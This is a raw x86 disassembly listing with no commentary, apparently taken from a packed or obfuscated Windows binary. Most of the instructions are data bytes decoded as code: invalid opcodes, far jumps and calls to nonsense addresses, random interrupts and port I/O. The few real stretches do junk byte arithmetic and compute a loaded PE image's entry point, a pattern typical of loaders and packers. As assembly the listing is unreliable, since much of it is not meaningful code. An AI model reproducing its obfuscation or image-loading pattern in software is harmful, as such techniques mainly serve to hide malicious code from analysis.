  41a569:	xor    esi,esi
  41a56b:	rol    dh,0x5b
  41a56e:	test   BYTE PTR [ebx],dl
  41a570:	jmp    0xcf8d:0x62c4878c
  41a577:	mov    ch,0x81
  41a579:	xchg   esp,eax
  41a57a:	lahf   
  41a57b:	pop    edx
  41a57c:	inc    ebp
  41a57d:	(bad)  
  41a57e:	data16 fwait
  41a580:	mov    ch,BYTE PTR [ecx+0x35058b39]
  41a586:	jmp    0x30f55c9f
  41a58b:	jmp    0x6fc798c4
  41a590:	sub    BYTE PTR [eax+0x6b45b2e6],dl
  41a596:	add    DWORD PTR [ecx-0x5d07a5ef],ebp
  41a59c:	int    0x47
  41a59e:	call   0xadf493fd
  41a5a3:	cli    
  41a5a4:	cmp    esp,DWORD PTR [esi-0x5e]
  41a5a7:	pop    ss
  41a5a8:	add    DWORD PTR [edx-0x4c0646ed],ebx
  41a5ae:	fwait
  41a5af:	pop    es
  41a5b0:	pop    esi
  41a5b1:	icebp  
  41a5b2:	sar    BYTE PTR [esi-0x8],1
  41a5b5:	adc    DWORD PTR cs:[esi-0x1a],esp
  41a5b9:	xor    al,0xee
  41a5bb:	add    DWORD PTR [esi],eax
  41a5bd:	int    0xc
  41a5bf:	jbe    0x41a59d
  41a5c1:	mov    edx,DWORD PTR [esp+0x1c]
  41a5c5:	shrd   ecx,edx,0x2
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	and    edi,DWORD PTR [esi+0x18]
  41a625:	sar    DWORD PTR [ebx+eiz*1-0x40],1
  41a629:	mov    esi,0xbebec235
  41a62e:	jge    0x41a62b
  41a630:	and    bl,bl
  41a632:	stc    
  41a633:	and    DWORD PTR [edi+0x383de983],ebx
  41a639:	imul   esi,DWORD PTR [esi+ebp*4],0x8
  41a63d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63e:	lock aaa 
  41a640:	mov    ch,0xac
  41a642:	sar    BYTE PTR [edi+0x4f2f18df],1
  41a648:	push   ebp
  41a649:	push   ebp
  41a64a:	mov    edi,0x2eac0ed4
  41a64f:	shr    DWORD PTR [edi+0x72acf6ea],1
  41a655:	les    eax,FWORD PTR [eax-0x2b4b4e0c]
  41a65b:	jmp    0x41a66e
  41a65d:	in     eax,dx
  41a65e:	mov    bh,0x92
  41a660:	(bad)  
  41a662:	xor    al,0x78
  41a664:	xchg   esp,eax
  41a665:	ficomp DWORD PTR [edi]
  41a667:	fcmovbe st,st(5)
  41a669:	and    ebx,DWORD PTR [ecx]
  41a66b:	jmp    0xfda2:0x6045e9ac
  41a672:	xchg   ecx,eax
  41a673:	dec    edi
  41a674:	add    DWORD PTR [edx-0x55],eax
  41a677:	and    ch,BYTE PTR [ebp-0x7679c5e9]
  41a67d:	lea    ebp,[edi]
  41a67f:	pop    ebx
  41a680:	imul   edx,ebp,0xd6f94762
  41a686:	cmc    
  41a687:	push   ebp
  41a688:	icebp  
  41a689:	mov    ebx,0xd4aea19
  41a68e:	adc    ecx,esp
  41a690:	neg    esp
  41a692:	popf   
  41a693:	xlat   BYTE PTR ds:[ebx]
  41a694:	js     0x41a6de
  41a696:	jne    0x41a6d4
  41a698:	mov    ecx,0x350a2f2e
  41a69d:	sti    
  41a69e:	push   ds
  41a69f:	pusha  
  41a6a0:	xor    eax,DWORD PTR [edx-0x497733a9]
  41a6a6:	sub    al,bh
  41a6a8:	push   ebx
  41a6a9:	ss aam 0x1b
  41a6ac:	ret    
  41a6ad:	or     eax,0x50b7d2ff
  41a6b2:	addr16 retf 0x8101
  41a6b6:	sbb    DWORD PTR [edi-0x680c4fbf],eax
  41a6bc:	into   
  41a6bd:	push   ebx
  41a6be:	es clc 
  41a6c0:	add    eax,DWORD PTR [edi-0x1bcd1095]
  41a6c6:	in     al,0x74
  41a6c8:	dec    ebx
  41a6c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6ca:	inc    edx
  41a6cb:	mov    edi,0xf86a20a3
  41a6d0:	pop    esp
  41a6d1:	sub    ch,BYTE PTR [edi+ebp*4-0x22]
  41a6d5:	outs   dx,BYTE PTR ds:[esi]
  41a6d6:	out    0x5a,al
  41a6d8:	popf   
  41a6d9:	sar    BYTE PTR [ebx],1
  41a6db:	pop    ebp
  41a6dc:	test   eax,0x10caa599
  41a6e1:	push   ebp
  41a6e2:	iret   
  41a6e3:	pusha  
  41a6e4:	je     0x41a756
  41a6e6:	data16 cmp al,0x7e
  41a6e9:	mov    ebp,0x405df4fa
  41a6ee:	mov    al,ds:0x5f07e171
  41a6f3:	(bad)  
  41a6f4:	not    BYTE PTR [edi]
  41a6f6:	or     esp,ecx
  41a6f8:	and    al,0x60
  41a6fa:	cld    
  41a6fb:	lods   eax,DWORD PTR ds:[esi]
  41a6fc:	test   DWORD PTR [edx-0x21],ebx
  41a6ff:	inc    edx
  41a700:	pop    ds
  41a701:	fwait
  41a702:	jecxz  0x41a718
  41a704:	(bad)  
  41a705:	sbb    eax,DWORD PTR [edi]
  41a707:	call   DWORD PTR [ebp+eax*8-0x70]
  41a70b:	aad    0x95
  41a70d:	jns    0x41a78e
  41a70f:	and    eax,0xee69c82a
  41a714:	or     edi,0xffffffc4
  41a717:	fdivr  QWORD PTR [edi]
  41a719:	out    0x32,al
  41a71b:	push   ds
  41a71c:	and    esi,DWORD PTR [edx+0x7c]
  41a71f:	gs mov bh,0x1a
  41a722:	jecxz  0x41a6bd
  41a724:	push   edi
  41a725:	push   edx
  41a726:	sub    ah,dl
  41a728:	xchg   BYTE PTR [edi],al
  41a72a:	pop    es
  41a72b:	or     eax,0x52880fab
  41a730:	pusha  
  41a731:	ins    DWORD PTR es:[edi],dx
  41a732:	das    
  41a733:	rol    BYTE PTR [edx],1
  41a735:	sbb    DWORD PTR [esi],esp
  41a737:	jne    0x41a7b0
  41a739:	ins    DWORD PTR es:[edi],dx
  41a73a:	data16 jbe 0x41a6f1
  41a73d:	lds    ebx,FWORD PTR [edi]
  41a73f:	fidiv  DWORD PTR [eax]
  41a741:	lock cld 
  41a743:	fwait
  41a744:	inc    ebp
  41a745:	pop    ds
  41a746:	jno    0x41a789
  41a748:	add    al,0x70
  41a74a:	or     DWORD PTR [esi-0x7f],ecx
  41a74d:	adc    ch,BYTE PTR [ebx-0x49]
  41a750:	push   ebx
  41a751:	(bad)  
  41a752:	jo     0x41a763
  41a754:	jecxz  0x41a727
  41a756:	pushf  
  41a757:	retf   0x4aa6
  41a75a:	scas   al,BYTE PTR es:[edi]
  41a75b:	pop    edx
  41a75c:	and    ah,BYTE PTR [edx]
  41a75e:	sub    esp,DWORD PTR [ebx+0x1349211e]
  41a764:	adc    BYTE PTR [edx+0x1ade33ca],bl
  41a76a:	div    BYTE PTR [ecx]
  41a76c:	mov    ebp,0xae9ebe9a
  41a771:	ficom  WORD PTR [ebx-0x2f]
  41a774:	not    BYTE PTR [esp+edi*2-0x1d21e1f8]
  41a77b:	lds    ecx,FWORD PTR [edx+0x877cb6b]
  41a781:	mov    ebx,0x3466f681
  41a786:	pop    ebx
  41a787:	ins    BYTE PTR es:[edi],dx
  41a788:	dec    eax
  41a789:	loopne 0x41a70e
  41a78b:	jbe    0x41a78c
  41a78d:	aad    0x4a
  41a78f:	out    0x3c,al
  41a791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a792:	fprem1 
  41a794:	(bad)  
  41a795:	scas   al,BYTE PTR es:[edi]
  41a796:	adc    eax,0x9d50b8d3
  41a79b:	rcr    BYTE PTR [ecx],1
  41a79d:	sbb    al,0x60
  41a79f:	ret    0xf9bc
  41a7a2:	jl     0x41a78c
  41a7a4:	arpl   WORD PTR [ebp-0x21bc608e],cx
  41a7aa:	icebp  
  41a7ab:	leave  
  41a7ac:	mov    ds:0xa368f4ce,eax
  41a7b1:	fistp  DWORD PTR [edx+0x2c]
  41a7b4:	aaa    
  41a7b5:	pop    edi
  41a7b6:	xchg   BYTE PTR [ebx+0x753d1959],ch
  41a7bc:	mov    edx,0x2a0dc277
  41a7c1:	lods   eax,DWORD PTR ds:[esi]
  41a7c2:	xchg   ebx,eax
  41a7c3:	sub    BYTE PTR [edx+0x48],al
  41a7c6:	popf   
  41a7c7:	and    eax,0x6081cb80
  41a7cc:	jmp    0x41a7c0
  41a7ce:	inc    ebx
  41a7cf:	lock xchg ebx,eax
  41a7d1:	cmp    ebp,ebp
  41a7d3:	nop
  41a7d4:	xlat   BYTE PTR ds:[ebx]
  41a7d5:	loopne 0x41a779
  41a7d7:	adc    al,0x69
  41a7d9:	adc    edi,DWORD PTR [eax]
  41a7db:	mov    bl,BYTE PTR [ebp-0x7e]
  41a7de:	jnp    0x41a767
  41a7e0:	mov    dl,0x3c
  41a7e2:	jge    0x41a7bc
  41a7e4:	ins    DWORD PTR es:[edi],dx
  41a7e5:	fidivr DWORD PTR [ebx-0x3863413d]
  41a7eb:	(bad)  
  41a7ec:	mov    esp,0x2c51b5a
  41a7f1:	and    eax,0x805fa77c
  41a7f7:	add    dl,BYTE PTR [eax+0x7d]
  41a7fa:	test   DWORD PTR [ebp-0x7e],edx
  41a7fd:	mov    dh,0xeb
  41a7ff:	sub    dl,BYTE PTR [edx+0x27]
  41a802:	lock mov esi,0xb6592940
  41a808:	lea    esi,[ecx-0xf]
  41a80b:	inc    ebp
  41a80c:	ror    BYTE PTR ds:0xa261bf46,0x33
  41a813:	or     al,0x26
  41a815:	mov    al,0x6b
  41a817:	outs   dx,BYTE PTR ds:[esi]
  41a818:	push   cs
  41a819:	js     0x41a7e7
  41a81b:	xor    dh,dl
  41a81d:	ja     0x41a89e
  41a81f:	xchg   ecx,eax
  41a820:	(bad)  
  41a821:	push   ss
  41a822:	sar    DWORD PTR [edx-0x58],cl
  41a825:	in     al,0x79
  41a827:	dec    ebx
  41a828:	sbb    eax,0xf6d8185d
  41a82d:	xor    DWORD PTR [eax],edi
  41a82f:	pop    ecx
  41a830:	sbb    BYTE PTR [esi],0xd9
  41a833:	dec    esp
  41a834:	push   edx
  41a835:	mov    esi,0x4a14e39
  41a83a:	sahf   
  41a83b:	sub    BYTE PTR [ebp+0xa],cl
  41a83e:	dec    ecx
  41a83f:	std    
  41a840:	adc    BYTE PTR [esi+0x4e4b445f],al
  41a846:	mov    ds:0x3f89f6e8,al
  41a84b:	mov    bh,0xdc
  41a84d:	lock push eax
  41a84f:	sbb    eax,0xb49ac615
  41a854:	pop    edx
  41a855:	fmul   st,st(5)
  41a857:	pusha  
  41a858:	iret   
  41a859:	pop    esp
  41a85a:	dec    ebx
  41a85b:	mov    ah,0x8
  41a85d:	dec    ebx
  41a85e:	xor    al,0x8
  41a860:	fsubp  st(2),st
  41a862:	lea    eax,[ecx]
  41a864:	sub    ebp,DWORD PTR [edx]
  41a866:	adc    BYTE PTR [ecx+0x1f],bh
  41a869:	dec    ebp
  41a86a:	and    al,0x73
  41a86c:	cwde   
  41a86d:	xor    eax,0x3c2444c6
  41a872:	ins    DWORD PTR es:[edi],dx
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x422708
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0x91d15a28
  41a9ae:	and    eax,DWORD PTR [edx-0x3fd60c31]
  41a9b4:	mov    esi,0xbebec235
  41a9b9:	(bad)  
  41a9ba:	popa   
  41a9bb:	fld    st(1)
  41a9bd:	sbb    esi,DWORD PTR [esi-0xa]
  41a9c0:	cmp    DWORD PTR [esi],esp
  41a9c2:	mov    cl,0x20
  41a9c4:	ror    BYTE PTR [esi],1
  41a9c6:	sbb    edx,esp
  41a9c8:	and    eax,0x991ce98f
  41a9cd:	xor    dl,cl
  41a9cf:	call   0x6b6c:0xdd2ee506
  41a9d6:	mov    ds:0x9469b9d0,al
  41a9db:	fmul   QWORD PTR [ecx-0x497eec8c]
  41a9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9e2:	push   ss
  41a9e3:	rcl    BYTE PTR [esi+eiz*4-0x2cf9f1bd],1
  41a9ea:	pop    ss
  41a9eb:	leave  
  41a9ec:	add    eax,0xc43ed4ce
  41a9f1:	and    bh,BYTE PTR [ebx-0x26]
  41a9f4:	inc    eax
  41a9f5:	cs dec edi
  41a9f7:	imul   esi,DWORD PTR [ecx+0x4b932278],0xffffffcf
  41a9fe:	(bad)  
  41a9ff:	mov    ebx,0xfff9492
  41aa04:	fmulp  st(0),st
  41aa06:	cmp    eax,esp
  41aa08:	scas   eax,DWORD PTR es:[edi]
  41aa09:	neg    DWORD PTR [ebx]
  41aa0b:	test   eax,0x4a1c7f77
  41aa10:	mov    al,0x4
  41aa12:	dec    edx
  41aa13:	bound  ebp,QWORD PTR ds:0x6c95a505
  41aa19:	xchg   edx,eax
  41aa1a:	repz ret 
  41aa1c:	retf   
  41aa1d:	mov    al,BYTE PTR [edi+0x15c722d9]
  41aa23:	jnp    0x41a9cc
  41aa25:	fidiv  WORD PTR ds:0xb6161732
  41aa2b:	sbb    bh,ch
  41aa2d:	cmp    eax,0x3adff36b
  41aa32:	xor    ebp,DWORD PTR [ecx]
  41aa34:	jo     0x41aaab
  41aa36:	sbb    cl,bh
  41aa38:	aam    0x71
  41aa3a:	mov    ebp,0xa0c2c7d1
  41aa3f:	xor    al,0x94
  41aa41:	fidivr WORD PTR ds:0x8b268bf1
  41aa47:	fcompp 
  41aa49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4a:	lds    ecx,FWORD PTR [ebx+ebp*1]
  41aa4d:	test   al,0x7e
  41aa4f:	or     DWORD PTR [edi],0x22a38ff6
  41aa55:	cdq    
  41aa56:	jl     0x41a9e1
  41aa58:	mov    eax,ds:0xddc06ba4
  41aa5d:	pop    eax
  41aa5e:	mov    ds:0x183d403b,al
  41aa63:	mov    cl,0x8
  41aa65:	outs   dx,DWORD PTR ds:[esi]
  41aa66:	add    al,0x3
  41aa68:	jg     0x41aadb
  41aa6a:	push   ss
  41aa6b:	xchg   ebx,eax
  41aa6c:	push   edi
  41aa6d:	mov    cs,esp
  41aa6f:	(bad)  
  41aa70:	mov    dh,ch
  41aa72:	mov    WORD PTR [edx],?
  41aa74:	and    dl,BYTE PTR [edi+0x2af164c4]
  41aa7a:	jb     0x41aa6d
  41aa7c:	jmp    FWORD PTR [ebx+0x474fe9e9]
  41aa82:	jnp    0x41aa55
  41aa84:	mov    bh,0x64
  41aa86:	int    0xd6
  41aa88:	cmp    DWORD PTR ds:0x2d56248,esi
  41aa8e:	push   0xa0ae591e
  41aa93:	das    
  41aa94:	sti    
  41aa95:	dec    esp
  41aa96:	ja     0x41aac3
  41aa98:	xchg   esp,eax
  41aa99:	daa    
  41aa9a:	test   al,0x2e
  41aa9c:	xchg   esp,eax
  41aa9d:	stos   DWORD PTR es:[edi],eax
  41aa9e:	push   0xffffff9d
  41aaa0:	test   al,0xf3
  41aaa2:	jg     0x41ab02
  41aaa4:	fistp  QWORD PTR [eax]
  41aaa6:	clc    
  41aaa7:	es cmp eax,0x24666aa6
  41aaad:	mov    cl,cl
  41aaaf:	popa   
  41aab0:	je     0x41aa72
  41aab2:	cmp    BYTE PTR [esi+0x3880909f],ah
  41aab8:	mov    ebx,0xdb901ad8
  41aabd:	in     eax,0x96
  41aabf:	out    0xaa,al
  41aac1:	ret    0xaa65
  41aac4:	rol    BYTE PTR ds:[edx-0x3c],1
  41aac8:	adc    al,0x44
  41aaca:	mov    esi,ss
  41aacc:	pop    ecx
  41aacd:	call   0x19c0:0xf79ca598
  41aad4:	xor    BYTE PTR cs:[ecx+0x5f8fb484],cl
  41aadb:	mov    edx,0x3bf5e71a
  41aae0:	inc    ebp
  41aae1:	dec    eax
  41aae2:	jmp    0x41aa8c
  41aae4:	sbb    al,0xa0
  41aae6:	mov    WORD PTR [ecx],gs
  41aae8:	jne    0x41aaab
  41aaea:	or     DWORD PTR ds:0x85ee43b,eax
  41aaf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaf1:	mov    esp,0xb9970f0c
  41aaf6:	pop    es
  41aaf7:	sbb    cl,0x19
  41aafa:	xchg   ebx,eax
  41aafb:	jae    0x41aafe
  41aafd:	pop    ebp
  41aafe:	jl     0x41aaec
  41ab00:	mov    BYTE PTR [edi+ebx*2],bh
  41ab03:	mov    ah,0xd7
  41ab05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab06:	rol    DWORD PTR [eax],1
  41ab08:	push   ecx
  41ab09:	pushf  
  41ab0a:	ins    BYTE PTR es:[edi],dx
  41ab0b:	fdivr  st(1),st
  41ab0d:	hlt    
  41ab0e:	sub    al,0x4
  41ab10:	mov    bl,BYTE PTR [edi]
  41ab12:	ja     0x41aaec
  41ab14:	adc    BYTE PTR [ecx+esi*8],cl
  41ab17:	pop    ds
  41ab18:	mov    ebp,0x3cd850e7
  41ab1d:	xor    al,BYTE PTR [edi-0x68b1f52f]
  41ab23:	mov    bl,ch
  41ab25:	xchg   ecx,eax
  41ab26:	push   cs
  41ab27:	fcomp  QWORD PTR [esi-0x2c]
  41ab2a:	jne    0x41ab71
  41ab2c:	je     0x41aba9
  41ab2e:	lods   eax,DWORD PTR ds:[esi]
  41ab2f:	and    ebx,DWORD PTR [ebx]
  41ab31:	sub    eax,0x571bec0b
  41ab36:	and    cl,ah
  41ab38:	in     al,dx
  41ab39:	mov    cl,0x37
  41ab3b:	mov    ecx,0x87762478
  41ab40:	nop
  41ab41:	daa    
  41ab42:	add    dh,BYTE PTR [esp-0x5e5978a8]
  41ab49:	inc    esi
  41ab4a:	adc    cl,al
  41ab4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab4d:	or     ebp,DWORD PTR [eax-0x6]
  41ab50:	cmc    
  41ab51:	or     BYTE PTR [edx],dh
  41ab53:	arpl   WORD PTR [edx-0x1c],dx
  41ab56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab57:	pop    esp
  41ab58:	call   0x14b18e54
  41ab5d:	rol    DWORD PTR [ebx],cl
  41ab5f:	out    0xec,al
  41ab61:	dec    ebp
  41ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab63:	stos   BYTE PTR es:[edi],al
  41ab64:	mov    al,BYTE PTR [esi+0x40694398]
  41ab6a:	inc    edx
  41ab6b:	mov    ds:0xb29d1093,eax
  41ab70:	sub    eax,0x9f237499
  41ab75:	push   ebp
  41ab76:	jnp    0x41ab25
  41ab78:	(bad)  
  41ab79:	out    0x61,al
  41ab7b:	stc    
  41ab7c:	sar    BYTE PTR [edx+0x72],cl
  41ab7f:	hlt    
  41ab80:	sti    
  41ab81:	les    ecx,FWORD PTR [edi+0x77]
  41ab84:	call   0x28f:0xa5308910
  41ab8b:	xchg   edx,eax
  41ab8c:	push   ebp
  41ab8d:	mov    ds:0x791a303d,al
  41ab92:	fst    st(0)
  41ab94:	inc    esp
  41ab95:	aad    0xaf
  41ab97:	add    esi,esi
  41ab99:	xlat   BYTE PTR ds:[ebx]
  41ab9a:	xlat   BYTE PTR ds:[ebx]
  41ab9b:	ret    0xb69
  41ab9e:	fcmovnbe st,st(7)
  41aba0:	pusha  
  41aba1:	xor    al,0xf8
  41aba3:	das    
  41aba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aba5:	or     bl,BYTE PTR [ecx]
  41aba7:	arpl   sp,cx
  41aba9:	inc    esi
  41abaa:	adc    esi,edi
  41abac:	lea    ecx,[ecx-0x3a]
  41abaf:	dec    edi
  41abb0:	add    eax,0x31e267be
  41abb5:	(bad)  [ecx]
  41abb7:	mov    eax,0xd1ec9dd3
  41abbc:	int    0x72
  41abbe:	bound  edx,QWORD PTR [ebp+0x3e2b4557]
  41abc4:	test   DWORD PTR [ebx],esp
  41abc6:	pop    ecx
  41abc7:	mov    ah,0xdf
  41abc9:	push   ebx
  41abca:	xchg   ah,ch
  41abcc:	add    edx,DWORD PTR ds:0x5d758532
  41abd2:	ror    DWORD PTR [ebp+0xa],0x48
  41abd6:	(bad)  
  41abd7:	lock out 0xf2,al
  41abda:	ret    0x5ebc
  41abdd:	xchg   edx,eax
  41abde:	fyl2x  
  41abe0:	push   eax
  41abe1:	dec    esi
  41abe2:	call   0x3c613070
  41abe7:	push   ebx
  41abe8:	sbb    dl,cl
  41abea:	mov    bh,0x3d
  41abec:	jbe    0x41abc6
  41abee:	dec    edi
  41abef:	call   0x8d41efc7
  41abf4:	cdq    
  41abf5:	jg     0x41ac72
  41abf7:	sbb    al,0x46
  41abf9:	and    eax,0xffffc244
  41abfe:	add    eax,DWORD PTR [esp+0x30]
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	fwait
  41ac19:	push   ecx
  41ac1a:	sub    dl,cl
  41ac1c:	imul   ebp,DWORD PTR ds:0xc235bec0,0xffffffbe
  41ac23:	mov    esi,0xdb7c2ade
  41ac28:	or     bl,BYTE PTR [edx*8-0x3ab0f933]
  41ac2f:	push   ecx
  41ac30:	xor    DWORD PTR [eax+0x18],0x67c07b2a
  41ac37:	mov    eax,0x43ea5ecd
  41ac3c:	fnstenv [edi+esi*4+0x0]
  41ac40:	arpl   WORD PTR es:[edx+0x546af6b4],bx
  41ac47:	test   al,0xd6
  41ac49:	sbb    bl,BYTE PTR [ecx-0x32]
  41ac4c:	outs   dx,DWORD PTR ds:[esi]
  41ac4d:	mov    esi,0xe6f37f31
  41ac52:	scas   al,BYTE PTR es:[edi]
  41ac53:	rcr    BYTE PTR gs:[edi],1
  41ac56:	fs adc edx,eax
  41ac59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac5a:	push   ds
  41ac5b:	xchg   ebx,eax
  41ac5c:	fmul   st,st(4)
  41ac5e:	mov    edx,0x3160ec50
  41ac63:	in     al,0xd8
  41ac65:	or     al,0xb1
  41ac67:	sub    esi,edi
  41ac69:	mul    DWORD PTR [edi]
  41ac6b:	and    bh,dh
  41ac6d:	cli    
  41ac6e:	add    eax,0x51131b98
  41ac73:	add    BYTE PTR ds:0x9452f74e,ch
  41ac79:	pop    ss
  41ac7a:	pop    eax
  41ac7b:	mov    DWORD PTR [esi+0x21d9c2b0],0x619cf739
  41ac85:	aad    0x97
  41ac87:	jo     0x41ac37
  41ac89:	mov    eax,0xccdace37
  41ac8e:	and    DWORD PTR [eax+ecx*4+0x62824b8d],ebp
  41ac95:	pusha  
  41ac96:	ret    0x6eb3
  41ac99:	sbb    ebp,DWORD PTR [esi+eax*4]
  41ac9c:	or     DWORD PTR es:[eax+edi*1+0x52a69fc3],ebx
  41aca4:	fiadd  WORD PTR [eax+0x4a762d74]
  41acaa:	xchg   ebp,eax
  41acab:	sub    dh,BYTE PTR [eax+0x3c92bf89]
  41acb1:	sub    edx,DWORD PTR [ebx+0x65]
  41acb4:	xor    bh,BYTE PTR [ebp+0x5]
  41acb7:	inc    ecx
  41acb8:	(bad)  
  41acba:	call   0xd18a:0xd8b7e0d0
  41acc1:	lods   eax,DWORD PTR ds:[esi]
  41acc2:	xchg   ebp,eax
  41acc3:	rcr    bl,1
  41acc5:	and    al,BYTE PTR [ebx]
  41acc7:	sbb    eax,0xb368011a
  41accc:	gs jmp 0xf3381fae
  41acd2:	test   eax,0xbabdf682
  41acd7:	imul   ebx,esp,0xffffffe0
  41acda:	sub    DWORD PTR [ebp-0x2f],ebp
  41acdd:	adc    eax,0x8119279c
  41ace2:	add    DWORD PTR [ebp+0x70],esp
  41ace5:	lods   eax,DWORD PTR ds:[esi]
  41ace6:	lods   al,BYTE PTR ds:[esi]
  41ace7:	mov    dh,0x42
  41ace9:	xchg   ebx,eax
  41acea:	int    0x58
  41acec:	scas   al,BYTE PTR es:[edi]
  41aced:	div    ch
  41acef:	sub    al,0x27
  41acf1:	jle    0x41ad2a
  41acf3:	mov    ebp,0xd4050f82
  41acf8:	cs jge 0x41ad78
  41acfb:	push   ecx
  41acfc:	mov    al,0xdc
  41acfe:	xchg   edi,eax
  41acff:	ins    BYTE PTR es:[edi],dx
  41ad00:	inc    esp
  41ad01:	call   0x683b1f64
  41ad06:	imul   BYTE PTR [eax+0x15]
  41ad09:	test   al,0x54
  41ad0b:	pop    ebp
  41ad0c:	mov    ebp,fs
  41ad0e:	daa    
  41ad0f:	mov    ds:0x2d440ee6,eax
  41ad14:	jns    0x41ad6d
  41ad16:	mov    bh,0x5c
  41ad18:	mov    DWORD PTR [ecx-0x24b1ed3e],esi
  41ad1e:	or     ah,BYTE PTR es:[edx-0x4f24b7fd]
  41ad25:	stc    
  41ad26:	add    eax,0xb52bc833
  41ad2b:	add    DWORD PTR [ebp-0x7ac7826a],esi
  41ad31:	popf   
  41ad32:	outs   dx,DWORD PTR ds:[esi]
  41ad33:	dec    edi
  41ad34:	lds    ecx,FWORD PTR [edi+ebp*2+0x5a71a102]
  41ad3b:	xor    al,0x50
  41ad3d:	push   cs
